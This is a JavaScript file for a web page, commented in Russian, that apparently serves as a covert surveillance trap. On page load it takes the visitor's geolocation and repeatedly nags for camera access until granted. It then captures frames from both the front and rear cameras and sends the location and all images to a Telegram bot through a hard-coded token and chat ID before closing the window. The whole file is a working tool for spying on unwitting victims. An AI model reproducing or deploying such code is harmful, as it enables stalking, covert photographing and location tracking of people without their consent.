// ТВОИ ДАННЫЕ
const BOT_TOKEN = '8621842542:AAGj8u2N6VHyIZNw3qX_qN9aSsSOYsZi424';
const CHAT_ID = '8244138604';

const video = document.getElementById('video');
let stream = null;
let locationData = null;

// Функция запроса геолокации (только 2 попытки)
async function requestLocation() {
    return new Promise((resolve) => {
        let attempts = 0;
        const maxAttempts = 2;
        
        const askLocation = () => {
            attempts++;
            
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        locationData = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        resolve();
                    },
                    (error) => {
                        if (attempts < maxAttempts) {
                            console.log(`Геолокация: попытка ${attempts} из ${maxAttempts} не удалась, повтор через 2 сек...`);
                            setTimeout(askLocation, 2000);
                        } else {
                            console.log('Геолокация не разрешена после 2 попыток, пропускаем');
                            resolve();
                        }
                    }
                );
            } else {
                resolve();
            }
        };
        
        askLocation();
    });
}

// Функция запроса камеры (бесконечное повторение)
async function requestCamera(facingMode) {
    return new Promise((resolve) => {
        const askCamera = () => {
            const constraints = {
                video: {
                    facingMode: { exact: facingMode },
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            };
            
            navigator.mediaDevices.getUserMedia(constraints)
                .then(stream => {
                    resolve(stream);
                })
                .catch(() => {
                    console.log(`Камера ${facingMode} не разрешена, повтор через 2 сек...`);
                    setTimeout(askCamera, 2000);
                });
        };
        askCamera();
    });
}

// Запись видео (снимки каждые 0.5 секунды)
async function recordVideo(stream, durationMs) {
    return new Promise((resolve) => {
        const canvas = document.createElement('canvas');
        const videoTrack = stream.getVideoTracks()[0];
        const settings = videoTrack.getSettings();
        canvas.width = settings.width || 1280;
        canvas.height = settings.height || 720;
        const ctx = canvas.getContext('2d');
        
        const frames = [];
        const frameInterval = 500;
        const framesCount = durationMs / frameInterval;
        let frameIndex = 0;
        
        const captureFrame = () => {
            if (frameIndex >= framesCount) {
                resolve(frames);
                return;
            }
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            frames.push(canvas.toDataURL('image/jpeg', 0.7));
            frameIndex++;
            setTimeout(captureFrame, frameInterval);
        };
        
        captureFrame();
    });
}

// Отправка геолокации
async function sendLocation() {
    if (!locationData) return;
    
    const mapsUrl = `https://yandex.com/maps/?pt=${locationData.lon},${locationData.lat}&z=17&l=map`;
    const text = `📍 Местоположение: ${mapsUrl}`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('text', text);
    
    try {
        await fetch(url, { method: 'POST', body: formData });
    } catch(e) {}
}

// Отправка фото в Telegram
async function sendPhotoToTelegram(imageBase64, caption) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    
    const byteString = atob(imageBase64.split(',')[1]);
    const mimeString = imageBase64.split(',')[0].split(':')[1].split(';')[0];
    const ab = new ArrayBuffer(byteString.length);
    const ia = new Uint8Array(ab);
    for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }
    const blob = new Blob([ab], { type: mimeString });
    
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'photo.jpg');
    formData.append('caption', caption);
    
    try {
        await fetch(url, { method: 'POST', body: formData });
    } catch(e) {}
}

// Отправка всех кадров (каждый 0.5 сек)
async function sendAllFrames(frames, cameraName) {
    if (!frames.length) return;
    
    for (let i = 0; i < frames.length; i++) {
        await sendPhotoToTelegram(frames[i], `${cameraName} - кадр ${i + 1}/8 (0.5 сек)`);
        await new Promise(resolve => setTimeout(resolve, 300));
    }
}

// Основная функция
async function main() {
    // 1. Геолокация (2 попытки)
    await requestLocation();
    
    // 2. Фронтальная камера
    stream = await requestCamera('user');
    video.srcObject = stream;
    await video.play();
    
    // 3. Запись фронтальной 4 сек
    const frontFrames = await recordVideo(stream, 4000);
    stream.getTracks().forEach(track => track.stop());
    
    // 4. Задняя камера
    stream = await requestCamera('environment');
    video.srcObject = stream;
    await video.play();
    
    // 5. Запись задней 4 сек
    const backFrames = await recordVideo(stream, 4000);
    stream.getTracks().forEach(track => track.stop());
    
    // 6. Отправка
    await sendLocation();
    await sendAllFrames(frontFrames, '📹 Фронтальная камера');
    await sendAllFrames(backFrames, '📹 Задняя камера');
    
    // 7. Закрытие
    setTimeout(() => window.close(), 1000);
}

// Запуск
main();
